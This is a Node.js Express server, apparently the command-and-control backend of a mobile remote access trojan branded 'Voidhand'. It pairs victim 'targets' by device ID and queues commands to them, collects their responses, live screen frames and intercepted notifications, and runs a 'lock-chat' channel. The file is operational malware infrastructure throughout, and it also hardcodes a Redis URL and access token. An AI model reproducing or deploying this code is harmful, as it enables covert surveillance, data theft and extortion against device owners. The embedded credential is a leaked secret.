const express = require("express");
const crypto = require("crypto");
const { Redis } = require("@upstash/redis");

const app = express();
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true, limit: "10mb" }));

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.sendStatus(204);
  next();
});

const redis = new Redis({
  url: "https://exact-hen-210622.upstash.io",
  token: "gQAAAAAAAza-AAIgcDJiMWJjOGRlM2Q1MGM0YjEwYWI3MWM2OGUyMjBiNmVmMw",
});

function genPairId() {
  return crypto.randomBytes(8).toString("hex").toUpperCase();
}

app.get("/ping", (_req, res) => res.send("pong"));

app.post("/api/claim-pair", async (req, res) => {
  try {
    const pairId = genPairId();
    await redis.set(`pair:${pairId}`, { id: pairId, createdAt: Date.now() });
    res.json({ valid: true, pairId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get("/rat/pairid", async (req, res) => {
  try {
    const keys = await redis.keys("pair:*");
    if (keys.length > 0) {
      const pairId = keys[0].replace("pair:", "");
      return res.json({ valid: true, pairId });
    }
    const pairId = genPairId();
    await redis.set(`pair:${pairId}`, { id: pairId, createdAt: Date.now() });
    res.json({ valid: true, pairId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post("/api/pair-target", async (req, res) => {
  try {
    const { pairId, deviceId, model, battery } = req.body;
    if (!pairId || !deviceId)
      return res.status(400).json({ error: "pairId and deviceId required" });

    const validPair = await redis.get(`pair:${pairId.toUpperCase()}`);
    if (!validPair) return res.status(404).json({ error: "invalid pairId" });

    const target = {
      id: deviceId,
      model: model || "Unknown",
      battery: battery || "?",
      pairId,
      status: "Online",
      lastSeen: new Date().toISOString(),
    };
    await redis.set(`target:${deviceId}`, target);
    res.json({ status: "paired" });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post("/api/register-target", async (req, res) => {
  try {
    const d = req.body;
    if (!d.id) return res.status(400).json({ error: "id required" });
    d.lastSeen = new Date().toISOString();
    await redis.set(`target:${d.id}`, d);
    res.json({ status: "ok" });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post("/api/heartbeat/:id", async (req, res) => {
  try {
    const id = req.params.id;
    const t = await redis.get(`target:${id}`);
    if (t) {
      t.lastSeen = new Date().toISOString();
      t.status = "Online";
      if (req.body.battery) t.battery = req.body.battery;
      await redis.set(`target:${id}`, t);
    }
    res.status(200).send("1");
  } catch (e) {
    res.status(500).send("0");
  }
});

app.get("/api/list-targets", async (req, res) => {
  try {
    const keys = await redis.keys("target:*");
    const targets = [];
    for (const k of keys) {
      targets.push(await redis.get(k));
    }
    res.json(targets);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get("/rat/my-devices", async (req, res) => {
  try {
    const now = Date.now();
    const keys = await redis.keys("target:*");
    const devices = [];
    for (const k of keys) {
      const t = await redis.get(k);
      if (!t) continue;
      const seen = Date.parse(t.lastSeen || 0) || 0;
      const on = now - seen < 30000;
      devices.push({
        id: t.id,
        model: t.model || "Unknown",
        battery: t.battery || "?",
        online: on,
        lastSeen: t.lastSeen,
      });
    }
    
    const pairKeys = await redis.keys("pair:*");
    const pairId = pairKeys.length > 0 ? pairKeys[0].replace("pair:", "") : null;

    res.json({
      valid: true,
      pairId,
      devices,
      myDevicesCount: devices.length,
      totalDevices: devices.length,
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get("/rat/permission-status", (_req, res) => {
  res.json({ valid: true });
});

app.post("/api/send-command", async (req, res) => {
  try {
    const { id, command, extra } = req.body;
    if (!id || !command)
      return res.status(400).json({ error: "id + command required" });

    const cmd = {
      targetId: id,
      command,
      extra: extra || "",
      timestamp: new Date().toISOString(),
    };
    await redis.set(`cmd:${id}`, cmd);
    res.json({ status: "queued" });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get("/api/get-command/:id", async (req, res) => {
  try {
    const cmd = await redis.get(`cmd:${req.params.id}`);
    if (!cmd) return res.status(204).send();
    await redis.del(`cmd:${req.params.id}`);
    res.json(cmd);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post("/api/post-response/:id", async (req, res) => {
  try {
    const { cmd, data } = req.body;
    const nr = {
      targetId: req.params.id,
      cmd,
      data,
      timestamp: new Date().toISOString(),
    };
    await redis.set(`resp:${req.params.id}`, nr);
    res.json({ status: "ok" });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get("/api/get-response/:id", async (req, res) => {
  try {
    const r = await redis.get(`resp:${req.params.id}`);
    res.json(r || {});
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post("/api/live-frame/:id", async (req, res) => {
  try {
    const { frame, ts } = req.body;
    if (!frame) return res.status(400).json({ error: "no frame" });
    await redis.set(`frame:${req.params.id}`, { frame, ts: ts || Date.now() });
    res.json({ status: "ok" });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get("/api/live-frame/:id", async (req, res) => {
  try {
    const d = await redis.get(`frame:${req.params.id}`);
    if (!d) return res.status(404).json({ error: "no frame yet" });
    res.json(d);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post("/api/post-notification/:id", async (req, res) => {
  try {
    const id = req.params.id;
    const notif = {
      targetId: id,
      ...req.body,
      timestamp: new Date().toISOString(),
    };
    await redis.lpush(`notifs:${id}`, notif);
    await redis.ltrim(`notifs:${id}`, 0, 99);
    res.json({ status: "saved" });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get("/api/get-notifications/:id", async (req, res) => {
  try {
    const notifs = await redis.lrange(`notifs:${req.params.id}`, 0, -1);
    res.json(notifs);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get("/api/lock-chat/:id", async (req, res) => {
  try {
    const msgs = await redis.lrange(`chat:${req.params.id}`, 0, -1);
    res.json({ messages: msgs });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post("/api/lock-chat/:id", async (req, res) => {
  try {
    const id = req.params.id;
    const { from, text, msg } = req.body;
    const chat = {
      from: from || "owner",
      text: text || msg || "",
      time: new Date().toISOString(),
    };
    await redis.rpush(`chat:${id}`, chat);
    await redis.ltrim(`chat:${id}`, -100, -1);
    res.json({ status: "ok" });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get("/api/lock-chat-all/:id", async (req, res) => {
  try {
    const msgs = await redis.lrange(`chat:${req.params.id}`, 0, -1);
    res.json({ messages: msgs });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.delete("/api/lock-chat/:id", async (req, res) => {
  try {
    await redis.del(`chat:${req.params.id}`);
    res.json({ status: "cleared" });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get("/api/stats", async (_req, res) => {
  try {
    const now = Date.now();
    const keys = await redis.keys("target:*");
    let online = 0;
    for (const k of keys) {
      const t = await redis.get(k);
      const seen = Date.parse(t?.lastSeen || 0) || 0;
      if (now - seen < 30000) online++;
    }
    res.json({
      onlineUsers: online,
      activeConnections: keys.length,
      totalTargets: keys.length,
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get("/", (_req, res) =>
  res.json({ name: "Voidhand API", status: "ok", version: "1.0.0" })
);

module.exports = app;

if (require.main === module) {
  const PORT = process.env.PORT || 3006;
  app.listen(PORT, "0.0.0.0", () =>
    console.log(`Voidhand API listening on :${PORT}`)
  );
    }
